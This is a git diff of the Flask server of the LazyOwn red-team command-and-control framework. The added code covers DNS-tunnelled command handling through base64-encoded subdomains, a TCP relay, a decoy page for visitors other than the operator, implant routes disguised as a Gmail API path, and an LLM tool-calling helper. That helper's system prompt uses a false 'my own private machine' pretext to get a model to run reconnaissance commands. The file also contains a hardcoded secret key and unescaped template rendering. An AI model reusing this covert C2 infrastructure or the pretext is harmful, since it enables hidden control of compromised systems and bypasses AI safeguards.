@@ -5,16 +5,22 @@ import sys
 import json
 import yaml
 import glob
+import time
 import socket
 import base64
 import logging
 import markdown
 import threading
 import pandas as pd
+from math import ceil
 from functools import wraps
+from datetime import datetime
 from lazyown import LazyOwnShell
+from modules.colors import retModel
+from watchdog.observers import Observer
 from dnslib.server import DNSServer, DNSLogger
 from jinja2 import Environment, FileSystemLoader
+from watchdog.events import FileSystemEventHandler
 from modules.lazygptcli2 import process_prompt, Groq
 from modules.lazygptvulns import process_prompt_vuln
 from modules.lazygpttask import process_prompt_task
@@ -22,75 +28,130 @@ from modules.lazyredopgpt import process_prompt_redop
 from modules.lazyagentAi import process_prompt_search
 from modules.lazygptcli3 import process_prompt_script
 from modules.lazygptcli4 import process_prompt_adversary
+from modules.lazygptcli5 import process_prompt_general
+from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, TXT, CNAME, MX, NS, SOA, CAA, TLSA, SSHFP
+from dnslib.server import DNSServer, BaseResolver, DNSLogger
 from dnslib.dns import RR, QTYPE, A, NS, SOA, TXT, CNAME, MX, AAAA, PTR, SRV, NAPTR, CAA, TLSA, SSHFP
 from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory, render_template_string, flash
+from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
+from werkzeug.security import generate_password_hash, check_password_hash
+from utils import getprompt
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+class Handler(FileSystemEventHandler):
+    @staticmethod
+    def on_any_event(event):
+        if event.is_directory:
+            return None
+
+        event_info = {
+            "type": event.event_type,
+            "src_path": event.src_path,
+            "dest_path": getattr(event, 'dest_path', None),
+            "size": os.path.getsize(event.src_path) if os.path.exists(event.src_path) else None,
+            "timestamp": datetime.now().isoformat()
+        }
+        if event.src_path.startswith(f"{BASE_DIR}{rhost}"):
+            global counter_events
+            global events
+            counter_events += 1
+            events.append(event_info)
+            if counter_events >= 1000:
+                events.sort(key=lambda x: x['timestamp'], reverse=True)
+                events = events[:1000]
+
+class Config:
+    def __init__(self, config_dict):
+        self.config = config_dict
+        for key, value in self.config.items():
+            setattr(self, key, value)
+
+    def __getitem__(self, key):
+        return getattr(self, key, None)
+
+def get_karma_name(elo):
+    if elo < 100:
+        return "Noob"
+    elif elo < 200:
+        return "Rookie"
+    elif elo < 300:
+        return "Skidy"
+    elif elo < 400:
+        return "Hacker"
+    elif elo < 500:
+        return "Pro"
+    elif elo < 600:
+        return "Elite"
+    else:
+        return "Godlike"
 
 def fromjson(value):
     return json.loads(value)
 
-BASE_DIR = os.getcwd()
-BASE_DIR += "/sessions/"
-ALLOWED_DIRECTORY = BASE_DIR
-shell = LazyOwnShell()
-shell.onecmd('p')
-shell.onecmd('create_session_json')
+def load_payload():
+    with open('payload.json', 'r') as file:
+        config = json.load(file)
+    return config
 
-if len(sys.argv) > 3:
-    lport = sys.argv[1]
-    USERNAME = sys.argv[2]
-    PASSWORD = sys.argv[3]
-    print(f"    [!] Launch C2 at: {lport}")
-else:
-    print("    [!] Need pass the port, user & pass as argument")
-    sys.exit(2)
+def load_banners():
+    with open('sessions/banners.json', 'r') as file:
+        config = json.load(file)
+    return config
 
-app = Flask(__name__, static_folder='static')
-app.secret_key = 'GrisIsComebackSayKnokKnokSecretlyxDjajajja'
-app.jinja_env.filters['fromjson'] = fromjson
-implants = {"implants": []}
-commands = {}
-results = {}
-commands_history = {}
-remote_commands_history = {}
-connected_clients = set()
-path = os.getcwd()
-atomic_framework_path = f'{path}/external/.exploit/atomic-red-team/atomics'
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-with open('payload.json', 'r') as file:
-    config = json.load(file)
-    api_key = config.get("api_key")
-    route_maleable = config.get("c2_maleable_route")
-    win_useragent_maleable = config.get("user_agent_win")
-    lin_useragent_maleable = config.get("user_agent_lin")
-    rhost = config.get("rhost")
+def load_mitre_data():
+    mitre_path = os.path.join("external", ".exploit", "mitre", "enterprise-attack", "enterprise-attack-16.1.json")
+    with open(mitre_path, "r") as f:
+        return json.load(f)
 
-implant_files = glob.glob(os.path.join(BASE_DIR, 'implant_config*.json'))
-logging.info(implant_files)
-if implant_files:
-    for i, file in enumerate(implant_files, start=1):
-        try:
-            with open(file, 'r') as f:
-                logging.info("Info: Implants created.")
-                content = f.read().strip()
-                implants["implants"].append({
-                    "implant": i,
-                    "content": content
-                })
-        except Exception as e:
-            print(f"Error al leer el archivo {file}: {e}")
+def load_event_config():
+    try:
+        with open('event_config.json', 'r') as f:
+            return json.load(f)
+    except FileNotFoundError:
+        return {"events": []}
 
-if not api_key:
-    logging.error("Error: La API key no está configurada en el archivo payload.json")
-    exit(1)
+def load_notifications():
+    JSON_FILE_PATH = 'sessions/notifications.json'
+    if not os.path.exists(JSON_FILE_PATH):
+        with open(JSON_FILE_PATH, 'w') as f:
+            json.dump([], f)
+    with open(JSON_FILE_PATH, 'r') as f:
+        notifications = json.load(f)
+    return notifications
 
-if not route_maleable:
-    logging.error("Error: c2_maleable_route not found ond payload.json add, Ex:\"c2_maleable_route\": \"/gmail/v1/users/\",")
-    sys.exit(1)
+def implants_check():
+    implants["implants"].clear()
 
-if not os.path.exists(atomic_framework_path):
-    shell.onecmd('atomic_tests')
+    implant_files = glob.glob(os.path.join(BASE_DIR, 'implant_config*.json'))
+    logging.info(implant_files)
+    if implant_files:
+        for i, file in enumerate(implant_files, start=1):
+            try:
+                with open(file, 'r') as f:
+                    logging.info("Info: Implants created.")
+                    content = f.read().strip()
+                    implants["implants"].append({
+                        "implant": i,
+                        "content": content
+                    })
+            except Exception as e:
+                print(f"[Error] reading file {file}: {e}")
 
-client = Groq(api_key=api_key)
+
+def start_watching():
+    event_handler = Handler()
+    observer = Observer()
+    observer.schedule(event_handler, DIRECTORY_TO_WATCH, recursive=True)
+    observer.start()
+
+    try:
+        while True:
+            time.sleep(1)
+    except:
+        observer.stop()
+    observer.join()
 
 def load_tasks():
     if not os.path.exists('sessions/tasks.json'):
@@ -120,21 +181,39 @@ def load_note():
     except json.JSONDecodeError:
         return {"content": ""}
 
+def aumentar_elo(user_id, cantidad):
+    if os.path.exists(USER_DATA_PATH):
+        with open(USER_DATA_PATH, 'r') as file:
+            users = json.load(file)
+    else:
+        users = []
+
+    usuario = next((user for user in users if user['id'] == user_id), None)
+
+    if usuario:
+
+        usuario['elo'] += cantidad
+        print(f"The Elo of user {usuario['username']} Increased in {usuario['elo']}.")
+
+        with open(USER_DATA_PATH, 'w') as file:
+            json.dump(users, file, indent=4)
+    else:
+        print(f"User ID {user_id} not found.")
+
 def save_note(content):
     file_path = 'sessions/notes.txt'
     with open(file_path, 'w') as file:
         file.write(json.dumps({"content": content}))
        
-
+def escape_js(s):
+    return json.dumps(s)[1:-1]
 
 def markdown_to_html(text):
-    return markdown.markdown(text)
-
-env = Environment(loader=FileSystemLoader('templates'))
-
-env.filters['markdown'] = markdown_to_html
-
-app.jinja_env.filters['markdown'] = markdown_to_html
+    if text:
+        html_content = markdown.markdown(text)
+    else:
+        return escape_js("")    
+    return escape_js(html_content)
 
 def to_serializable(obj):
     """Convert objects to serializable format."""
@@ -151,11 +230,6 @@ def make_serializable(data):
     else:
         return to_serializable(data)
 
-@app.template_filter('tojson')
-def tojson_filter(value, **kwargs):
-    """Custom tojson filter to handle non-serializable objects."""
-    return json.dumps(make_serializable(value), **kwargs)
-
 def escape_js_string(value):
     """Escape special characters in a string for JavaScript."""
     if isinstance(value, str):
@@ -163,6 +237,10 @@ def escape_js_string(value):
         value = re.sub(r'\n', r'\\n', value)
         value = re.sub(r'\r', r'\\r', value)
     return value
+
+def strip_ansi(s):
+    ansi_regex = re.compile(r'[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]')
+    return ansi_regex.sub('', s)
 
 def check_auth(username, password):
     """Verifica si el usuario y contraseña son correctos"""
@@ -185,75 +263,417 @@ def requires_auth(f):
         return f(*args, **kwargs)
     return decorated
 
-def start_dns_server():
-    """
-    Inicia un servidor DNS que responde con registros específicos para varios subdominios.
-    """
-    class CustomDNSResolver:
-        def resolve(self, request, handler):
-            reply = request.reply()
-            qname = request.q.qname
-            qtype = request.q.qtype
+def aicmd(cmd):
+    if cmd == 'ping':
+        ping = shell.one_cmd("ping")
+        ping = strip_ansi(ping)
+        return ping
 
-            subdomain_responses = {
-                "info.esporalibre.cl.": {
-                    QTYPE.A: A("192.168.1.98"),
-                    QTYPE.TXT: TXT("Información sobre esporalibre.cl")
-                },
-                "mail.esporalibre.cl.": {
-                    QTYPE.A: A("192.168.1.98"),
-                    QTYPE.MX: MX("mail.esporalibre.cl.")
-                },
-                "www.esporalibre.cl.": {
-                    QTYPE.A: A("192.168.1.98"),
-                    QTYPE.CNAME: CNAME("esporalibre.cl.")
-                },
-                "ns.esporalibre.cl.": {
-                    QTYPE.NS: NS("ns.esporalibre.cl.")
-                },
-                "esporalibre.cl.": {
-            
-                    QTYPE.SOA: SOA(
-                        "ns.esporalibre.cl.",    
-                        "admin.esporalibre.cl.",  
-                        (
-                            1,    
-                            3600, 
-                            600,  
-                            86400,
-                            3600  
-                        )
-                    ),
-                    QTYPE.MX: MX("mail.esporalibre.cl."),
-                    QTYPE.TXT: TXT("v=spf1 include:_spf.google.com ~all"),
-                    QTYPE.CAA: CAA(0, "issue", "letsencrypt.org"),
-                    QTYPE.TLSA: TLSA(1, 1, 1, b"your_tlsa_data"),
-                    QTYPE.SSHFP: SSHFP(1, 1, b"your_sshfp_data")
-                }
+
+    cmd_string = cmd
+    commands = [
+        {
+            "ping": {
+                "content_system": "You are a bot and the mission is identify if the target is alive and the os or if is offline. give me the result of the command",
+                "content_user": "the host is alive and what os is?",
+                "func_desc": "Evaluate if the host is a live or not and the host os",
+                "command_desc": "The command to evaluate the target",
             }
+        },
+        {
+            "gospider ssl": {
+                "content_system": "You are a bot and the mission is to analyze the result of the gospider tool and provide info helpfull to the user, the test is on my machine private and i only have access",
+                "content_user": "what routes is interesting in redteam context",
+                "func_desc": "send a spider to web scrap a host or url",
+                "command_desc": "The command to webscaping with gospider to the target",
+            }
+        }
+    ]
+    command_info = None
+    for command in commands:
+        if cmd_string in command:
+            command_info = command[cmd_string]
+            break
 
-            if str(qname) in subdomain_responses:
-                if qtype in subdomain_responses[str(qname)]:
-                    reply.add_answer(RR(qname, qtype, rdata=subdomain_responses[str(qname)][qtype], ttl=300))
-                else:
-                    reply.header.rcode = 3
+    if not command_info:
+        return "Command not found"
+
+    messages = [
+        {
+            "role": "system",
+            "content": command_info["content_system"]
+        },
+        {
+            "role": "user",
+            "content": command_info["content_user"],
+        }
+    ]
+
+    tools = [
+        {
+            "type": "function",
+            "function": {
+                "name": "shell.one_cmd",
+                "description": command_info["func_desc"],
+                "parameters": {
+                    "type": "object",
+                    "properties": {
+                        "command": {
+                            "type": "string",
+                            "description": command_info["command_desc"],
+                        }
+                    },
+                    "required": ["command"],
+                },
+            },
+        }
+    ]
+    logging.info(MODEL)
+    response = client.chat.completions.create(
+        model=MODEL,
+        messages=messages,
+        stream=False,
+        tools=tools,
+        tool_choice="auto",
+    )
+
+    response_message = response.choices[0].message
+    tool_calls = response_message.tool_calls
+
+    if tool_calls:
+        available_functions = {
+            "shell.one_cmd": shell.one_cmd,
+        }
+
+        messages.append(response_message)
+
+        for tool_call in tool_calls:
+            function_name = tool_call.function.name
+            function_to_call = available_functions[function_name]
+            function_args = json.loads(tool_call.function.arguments)
+
+            function_response = function_to_call(
+                command=cmd_string
+            )
+
+            messages.append(
+                {
+                    "tool_call_id": tool_call.id,
+                    "role": "tool",
+                    "name": function_name,
+                    "content": function_response,
+                }
+            )
+
+        second_response = client.chat.completions.create(
+            model=MODEL,
+            messages=messages
+        )
+
+        response_bot = second_response.choices[0].message.content
+        return response_bot
+
+def search_database(term, data_path="parquets/techniques.parquet"):
+    """
+    Busca un término en un DataFrame, manejando listas y structs correctamente.
+
+    Args:
+        term (str): El término de búsqueda.
+        data_path (str, optional): Ruta al archivo Parquet.
+
+    Returns:
+        str: Contenido Markdown de los resultados, o mensaje de error.
+    """
+    try:
+        df = pd.read_parquet(data_path)
+    except FileNotFoundError:
+        return f"Error: File not found {data_path}"
+    except ValueError as e:
+        return f"Error reading Parquet: {e}"
+
+    for col in df.columns:
+        if df[col].apply(lambda x: isinstance(x, list)).any():
+            df[col] = df[col].apply(lambda x: ', '.join(map(str, x)) if isinstance(x, list) else x)
+
+    struct_cols_to_drop = []
+    for col in df.columns:
+        if df[col].apply(lambda x: isinstance(x, dict)).any():
+            struct_cols_to_drop.append(col)
+            df = pd.concat([df.drop(columns=[col]), df[col].apply(pd.Series).add_prefix(f"{col}.")], axis=1)
+
+    term_lower = term.lower()
+    results = df[df.apply(lambda row: row.astype(str).str.lower().str.contains(term_lower).any(), axis=1)]
+
+    md_content = ""
+    if not results.empty:
+        for _, row in results.iterrows():
+            md_content += f"# Result {_ + 1}\n"  # Añade un título para cada resultado
+            for key, value in row.items():
+                md_content += f"- **{key}**: {value}\n"
+            md_content += "\n"
+    else:
+        md_content = f"No Results for: '{term}'\n"
+
+    return md_content
+
+def secure_filename(filename):
+    """
+    Sanitize the filename to prevent directory traversal and unauthorized access.
+
+    :param filename: The original filename from the upload.
+    :return: A sanitized filename that is safe for storage.
+    """
+    filename = re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
+    return filename[:255]
+
+class CustomDNSResolver(BaseResolver):
+    def resolve(self, request, handler):
+        reply = request.reply()
+        qname = str(request.q.qname)
+        qtype = request.q.qtype
+
+        # Loggear la consulta entrante
+        logger.info(f"Consulta recibida: {qname} (Tipo: {QTYPE[qtype]})")
+
+        # Extraer el subdominio (comando codificado en base64)
+        subdomain = qname.replace(".c2.lazyown.org.", "").rstrip('.')
+
+        # Respuestas predefinidas para subdominios específicos
+        subdomain_responses = {
+            "info.esporalibre.cl.": {
+                QTYPE.A: A("192.168.1.98"),
+                QTYPE.TXT: TXT("Información sobre esporalibre.cl")
+            },
+            "mail.esporalibre.cl.": {
+                QTYPE.A: A("192.168.1.98"),
+                QTYPE.MX: MX("mail.esporalibre.cl.")
+            },
+            "www.esporalibre.cl.": {
+                QTYPE.A: A("192.168.1.98"),
+                QTYPE.CNAME: CNAME("esporalibre.cl.")
+            },
+            "ns.esporalibre.cl.": {
+                QTYPE.NS: NS("ns.esporalibre.cl.")
+            },
+            "esporalibre.cl.": {
+                QTYPE.SOA: SOA(
+                    "ns.esporalibre.cl.",
+                    "admin.esporalibre.cl.",
+                    (1, 3600, 600, 86400, 3600)
+                ),
+                QTYPE.MX: MX("mail.esporalibre.cl."),
+                QTYPE.TXT: TXT("v=spf1 include:_spf.google.com ~all"),
+                QTYPE.CAA: CAA(0, "issue", "letsencrypt.org"),
+                QTYPE.TLSA: TLSA(1, 1, 1, b"your_tlsa_data"),
+                QTYPE.SSHFP: SSHFP(1, 1, b"your_sshfp_data")
+            },
+            # Configurar respuestas para c2.lazyown.org y sus subdominios
+            "c2.lazyown.org.": {
+                QTYPE.A: A("127.0.0.1"),  # IP del servidor DNS
+                QTYPE.TXT: TXT("Servidor C2 activo")
+            }
+        }
+
+        # Verificar si el dominio tiene una respuesta predefinida
+        if qname in subdomain_responses:
+            if qtype in subdomain_responses[qname]:
+                reply.add_answer(RR(qname, qtype, rdata=subdomain_responses[qname][qtype], ttl=300))
+                logger.info(f"Respuesta predefinida enviada para {qname}")
             else:
-                reply.header.rcode = 3
+                reply.header.rcode = 3  # NXDOMAIN
+                logger.warning(f"Tipo de consulta no soportado para {qname}: {QTYPE[qtype]}")
+        else:
+            # Manejar subdominios de c2.lazyown.org
+            if qname.endswith("c2.lazyown.org."):
+                try:
+                    # Decodificar el comando desde el subdominio
+                    command = base64.urlsafe_b64decode(subdomain + "==").decode('utf-8') 
+                    logger.info(f"Comando recibido: {command}")
 
-            return reply
+                    # Procesar el comando
+                    if command.startswith("exec:"):
+                        output = f"Ejecutado: {command[5:]}"
+                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(output), ttl=60))
+                        logger.info(f"Respuesta enviada: {output}")
+                    else:
+                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Comando no reconocido"), ttl=60))
+                        logger.warning(f"Comando no reconocido: {command}")
 
+                except Exception as e:
+                    logger.error(f"Error procesando comando: {e}")
+                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Error en el comando"), ttl=60))
+            else:
+                # Dominio no reconocido
+                reply.header.rcode = 3  # NXDOMAIN
+                logger.warning(f"Dominio no reconocido: {qname}")
+
+        return reply
+
+def start_dns_server():
     resolver = CustomDNSResolver()
-    logger = DNSLogger(prefix=False)
-    server = DNSServer(resolver, port=53, address="0.0.0.0", logger=logger)
-    print("    [*] Server DNS started at port 53.")
+    logger.info("Iniciando servidor DNS en el puerto 53...")
+    server = DNSServer(resolver, port=53, address="0.0.0.0")
     server.start()
+
+def tcp_bridge(local_port, remote_host, remote_port):
+    """Establish a TCP bridge between a local port and a remote host."""
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind(('0.0.0.0', local_port))
+    server_socket.listen(5)
+    print(f"[*] Listening for connections on port {local_port}...")
+
+    while True:
+        client_socket, addr = server_socket.accept()
+        print(f"[INFO] Accepted connection from {addr}")
+
+        threading.Thread(target=handle_client, args=(client_socket, remote_host, remote_port)).start()
+
+def handle_client(client_socket, remote_host, remote_port):
+    """Handle communication between the client and the remote server."""
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+        server_socket.connect((remote_host, remote_port))
+
+        while True:
+
+            client_data = client_socket.recv(4096)
+            if not client_data:
+                break
+            server_socket.sendall(client_data)
+
+            server_data = server_socket.recv(4096)
+            if not server_data:
+                break
+            client_socket.sendall(server_data)
+
+    client_socket.close()
+
+def decoy():
+    client_ip = request.remote_addr
+    if client_ip != lhost:
+        return render_template('decoy.html')
+    return None
+
+app = Flask(__name__, static_folder='static')
+app.secret_key = 'GrisIsComebackSayKnokKnokSecretlyxDjajajja'
+app.config['SECRET_KEY'] = app.secret_key
+app.config['SESSION_COOKIE_SECURE'] = True  # Solo enviar cookies sobre HTTPS
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['REMEMBER_COOKIE_SECURE'] = True
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+app.jinja_env.filters['fromjson'] = fromjson
+app.jinja_env.filters['markdown'] = markdown_to_html
+BASE_DIR = os.getcwd()
+TOOLS_DIR = f'{BASE_DIR}/tools'
+BASE_DIR += "/sessions/"
+ALLOWED_DIRECTORY = BASE_DIR
+MODEL = retModel()
+shell = LazyOwnShell()
+shell.onecmd('p')
+shell.onecmd('create_session_json')
+
+implants = {"implants": []}
+commands = {}
+results = {}
+commands_history = {}
+remote_commands_history = {}
+connected_clients = set()
+path = os.getcwd()
+atomic_framework_path = f'{path}/external/.exploit/atomic-red-team/atomics'
+events = []
+counter_events = 0
+
+login_manager = LoginManager(app)
+login_manager.login_view = 'login'
+USER_DATA_PATH = 'users.json'
+ENV = "PROD"
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+config = Config(load_payload())
+
+api_key = config.api_key
+route_maleable = config.c2_maleable_route
+win_useragent_maleable = config.user_agent_win
+lin_useragent_maleable = config.user_agent_lin
+rhost = config.rhost
+lhost = config.lhost
+
+DIRECTORY_TO_WATCH = f"{BASE_DIR}"
+client = Groq(api_key=api_key)
+env = Environment(loader=FileSystemLoader('templates'))
+env.filters['markdown'] = markdown_to_html
+
+implants_check()
+
+if len(sys.argv) > 3:
+    lport = sys.argv[1]
+    USERNAME = sys.argv[2]
+    PASSWORD = sys.argv[3]
+    print(f"    [!] Launch C2 at: {lport}")
+else:
+    print("    [!] Need pass the port, user & pass as argument")
+    sys.exit(2)
+
+if not api_key:
+    logging.error("Error: La API key no está configurada en el archivo payload.json")
+    exit(1)
+
+if not route_maleable:
+    logging.error("Error: c2_maleable_route not found ond payload.json add, Ex:\"c2_maleable_route\": \"/gmail/v1/users/\",")
+    sys.exit(1)
+
+if not os.path.exists(atomic_framework_path):
+    shell.onecmd('atomic_tests')
+
+class User(UserMixin):
+    def __init__(self, user_data):
+        self.id = user_data['id']
+        self.username = user_data['username']
+        self.password_hash = user_data['password_hash']
+        self.elo = user_data['elo']
+
+def load_users():
+    if os.path.exists(USER_DATA_PATH):
+        with open(USER_DATA_PATH, 'r') as file:
+            return json.load(file)
+    return []
+
+def save_users(users):
+    with open(USER_DATA_PATH, 'w') as file:
+        json.dump(users, file, indent=4)
+
+@login_manager.user_loader
+def load_user(user_id):
+    users = load_users()
+    for user_data in users:
+        if user_data['id'] == int(user_id):
+            return User(user_data)
+    return None
+
+@app.template_filter('tojson')
+def tojson_filter(value, **kwargs):
+    """Custom tojson filter to handle non-serializable objects."""
+    return json.dumps(make_serializable(value), **kwargs)
 
 @app.route('/', methods=['GET', 'POST'])
 @requires_auth
 def index():
+    response = decoy()
+    client_ip = request.remote_addr
+    if response:
+        return response
+    else:
+        if current_user.is_authenticated:
+            print(f"Autenticated. Wellcome {client_ip}") 
+        else:
+            print("Unautenticated.")
+            return redirect(url_for('login'))
     path = os.getcwd()
+
+    prompt = getprompt()
+    prompt = prompt.replace('\n','<br>')
     sessions_dir = f'{path}/sessions'
     json_files = [f for f in os.listdir(sessions_dir) if f.endswith('.json')]
+    implants_check()
     if not json_files:
         return "No JSON files found in the sessions directory.", 404
     tasks = load_tasks()
@@ -314,10 +734,22 @@ def index():
                         hostname[client_id] = rows[-1]['hostname']
                         ips[client_id] = rows[-1]['ips']
                         user[client_id] = rows[-1]['user']
-                        print(commands_history)
+                     
         except Exception as e:
             print("[Error] implant logs corrupted.")
-
+    
+    event_config = load_event_config()
+    response_bot = "<p><h3>LazyOwn RedTeam Framework</h3> The <b>First GPL Ai Powered C&C</b> of the <b>World</b></p>"
+    tools = []
+    for filename in os.listdir(TOOLS_DIR):
+        if filename.endswith('.tool'):
+            tool_path = os.path.join(TOOLS_DIR, filename)
+            with open(tool_path, 'r') as file:
+                tool_data = json.load(file)
+                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
+                tools.append(tool_data)
+    
+    karma_name = get_karma_name(current_user.elo)
     return render_template(
         'index.html',
         connected_clients=connected_clients_list,
@@ -336,9 +768,17 @@ def index():
         lin_useragent=lin_useragent_maleable,
         implants=implants,
         directories=directories,
-        tasks=tasks
+        tasks=tasks,
+        bot=response_bot,
+        event_config=event_config,
+        config=config,
+        tools=tools,
+        current_user=current_user, 
+        karma_name=karma_name,
+        current_user_id = current_user.id,
+        elo=current_user.elo,
+        prompt = prompt
     )
-
 
 @app.route('/command/<client_id>', methods=['GET'])
 @app.route(f'{route_maleable}<client_id>', methods=['GET'])
@@ -492,6 +932,9 @@ def upload():
 @app.route('/view_yaml', methods=['POST'])
 @requires_auth
 def view_yaml():
+    response = decoy()
+    if response:
+        return response    
     selected_directory = request.form.get('directory')
     if not selected_directory:
         return redirect(url_for('index'))
@@ -549,6 +992,7 @@ def serve_file(file_path):
 @app.route('/api/run', methods=['POST'])
 @requires_auth
 def run_command():
+    
     data = request.json
     command = data.get('command')
 
@@ -642,13 +1086,35 @@ def chatbot():
 
 @app.route('/vuln', methods=['POST'])
 def vuln():
+    global events
     data = request.json
     file = f"{path}/sessions/vulns_{rhost}.nmap"
-    print(file)
     debug = data.get('debug', True)
+    event_view = data.get('event_view', "")
+    
+    event_config = load_event_config()
+    
+    print(events)    
+    
+    response = {
+        "events": events
+    }
+
+    for event in event_config["events"]:
+        event_key = event["name"]
+        src_path = event["src_path"].format(BASE_DIR=BASE_DIR, rhost=rhost)
+        size = event["size"]
+        if event_view == event_key:
+            current_src_path = src_path
+        else:
+            current_src_path = ""
+    logging.info(event_view)
+    logging.info(current_src_path)
     if not file:
-        return jsonify({"error": "El file es requerido"}), 400
-    response = process_prompt_vuln(client, file, debug)
+        return jsonify({"error": "run lazynmap before"}), 400
+
+    
+    response = process_prompt_vuln(client, file, debug, event_view)
     with open(f"{BASE_DIR}/plan.txt", 'w') as f:
        f.write(response)
        f.close()
@@ -659,7 +1125,6 @@ def vuln():
 def taskbot():
     data = request.json
     file = f"{path}/sessions/tasks.json"
-    print(file)
     debug = data.get('debug', True)
     if not file:
         return jsonify({"error": "El file es requerido"}), 400
@@ -693,7 +1158,6 @@ def script():
 def redop():
     data = request.json
     file = f"{path}/sessions/sessionLazyOwn.json"
-    print(file)
     debug = data.get('debug', True)
     if not file:
         return jsonify({"error": "El file es requerido"}), 400
@@ -715,13 +1179,30 @@ def adversary():
     response = process_prompt_adversary(client, prompt, debug)
     return jsonify({"response": response})
 
+@app.route('/generalbot', methods=['POST'])
+def generalbot():
+    data = request.json
+    prompt = data.get('prompt')
+    debug = data.get('debug', False)
+    if not prompt:
+        return jsonify({"error": "El prompt es requerido"}), 400
+
+    response = process_prompt_general(client, prompt, debug)
+    return jsonify({"response": response})
+
 @app.route('/csv_to_html', methods=['POST'])
 def csv_to_html():
+    response = decoy()
+    if response:
+        return response
     file_path = request.json.get('file_path')
     if not file_path:
         return jsonify({"error": "No file path provided"}), 400
 
-    
+    path = os.getcwd()
+    sessions = f"{path}/sessions/"
+    file_path = sessions + secure_filename(file_path)
+
     sanitized_file_path = os.path.normpath(file_path)
     sanitized_file_path = os.path.realpath(sanitized_file_path)
 
@@ -732,11 +1213,14 @@ def csv_to_html():
 
     
     relative_path = os.path.relpath(sanitized_file_path, allowed_directory_realpath)
+    
     if '..' in relative_path or relative_path.startswith('/'):
         return jsonify({"error": "Invalid file path"}), 403
-
+    
     full_path = os.path.join(allowed_directory_realpath, relative_path)
+    
 
+    
     try:
         with open(full_path, 'r') as file:
             reader = csv.reader(file)
@@ -759,51 +1243,11 @@ def csv_to_html():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-def search_database(term, data_path="parquets/techniques.parquet"):
-    """
-    Busca un término en un DataFrame, manejando listas y structs correctamente.
-
-    Args:
-        term (str): El término de búsqueda.
-        data_path (str, optional): Ruta al archivo Parquet.
-
-    Returns:
-        str: Contenido Markdown de los resultados, o mensaje de error.
-    """
-    try:
-        df = pd.read_parquet(data_path)
-    except FileNotFoundError:
-        return f"Error: File not found {data_path}"
-    except ValueError as e:
-        return f"Error reading Parquet: {e}"
-
-    for col in df.columns:
-        if df[col].apply(lambda x: isinstance(x, list)).any():
-            df[col] = df[col].apply(lambda x: ', '.join(map(str, x)) if isinstance(x, list) else x)
-
-    struct_cols_to_drop = []
-    for col in df.columns:
-        if df[col].apply(lambda x: isinstance(x, dict)).any():
-            struct_cols_to_drop.append(col)
-            df = pd.concat([df.drop(columns=[col]), df[col].apply(pd.Series).add_prefix(f"{col}.")], axis=1)
-
-    term_lower = term.lower()
-    results = df[df.apply(lambda row: row.astype(str).str.lower().str.contains(term_lower).any(), axis=1)]
-
-    md_content = ""
-    if not results.empty:
-        for _, row in results.iterrows():
-            md_content += f"# Result {_ + 1}\n"  # Añade un título para cada resultado
-            for key, value in row.items():
-                md_content += f"- **{key}**: {value}\n"
-            md_content += "\n"
-    else:
-        md_content = f"No Results for: '{term}'\n"
-
-    return md_content
-
 @app.route('/search_results', methods=['POST'])
 def search_results():
+    response = decoy()
+    if response:
+        return response    
     term = request.form.get('input')
     md_content = search_database(term,"parquets/techniques.parquet")
     html_content = markdown.markdown(md_content)
@@ -811,14 +1255,22 @@ def search_results():
     html_content2 = markdown.markdown(md_content_d)
     md_content_b = search_database(term,"parquets/binarios.parquet")
     html_content3 = markdown.markdown(md_content_b)
-    return render_template_string(html_content+html_content2+html_content3)
+    headers_content = render_template('header2.html')
+    footer = render_template('footer.html')
+    return render_template_string(headers_content + html_content+html_content2+html_content3+footer )
 
 @app.route('/graph')
 def graph():
+    response = decoy()
+    if response:
+        return response    
     return render_template('graph.html')
 
 @app.route('/task/<int:task_id>')
 def task(task_id):
+    response = decoy()
+    if response:
+        return response    
     tasks = load_tasks()
     task = next((t for t in tasks if t['id'] == task_id), None)
     if not task:
@@ -829,11 +1281,25 @@ def task(task_id):
 
 @app.route('/gettasks', methods=['GET'])
 def get_tasks():
+    response = decoy()
+    if response:
+        return response    
     tasks = load_tasks()
     return jsonify(tasks)
     
+@app.route('/tasks', methods=['GET'])
+def tasks():
+    response = decoy()
+    if response:
+        return response    
+    tasks = load_tasks()
+    return render_template('tasks.html', tasks=tasks)
+    
 @app.route('/task/<int:task_id>/edit', methods=['GET', 'POST'])
 def edit_task(task_id):
+    response = decoy()
+    if response:
+        return response    
     tasks = load_tasks()
     task = next((t for t in tasks if t['id'] == task_id), None)
     if not task:
@@ -863,6 +1329,9 @@ def edit_task(task_id):
 
 @app.route('/notes', methods=['GET', 'POST'])
 def edit_notes():
+    response = decoy()
+    if response:
+        return response    
     if request.method == 'POST':
         content = str(request.form['content'])
         notes = content
@@ -876,18 +1345,413 @@ def edit_notes():
 
 @app.route('/getnotes', methods=['GET'])
 def get_notes():
+    response = decoy()
+    if response:
+        return response    
     notes = load_note()
     return jsonify(notes)
 
 @app.route('/view_note')
 def view_note():
+    response = decoy()
+    if response:
+        return response    
     note = load_note()
     return render_template('view_note.html', note=note)
+
+@app.route('/push_notification', methods=['POST'])
+def push_notification():
+    html_content = request.form.get('html')
+    if not html_content:
+        return jsonify({"error": "HTML content is required"}), 400
+    notifications = load_notifications()
+    notifications.append({"html": html_content})
+    JSON_FILE_PATH = "sessions/notifications.json"
+    with open(JSON_FILE_PATH, 'w') as f:
+        json.dump(notifications, f, indent=4)
+
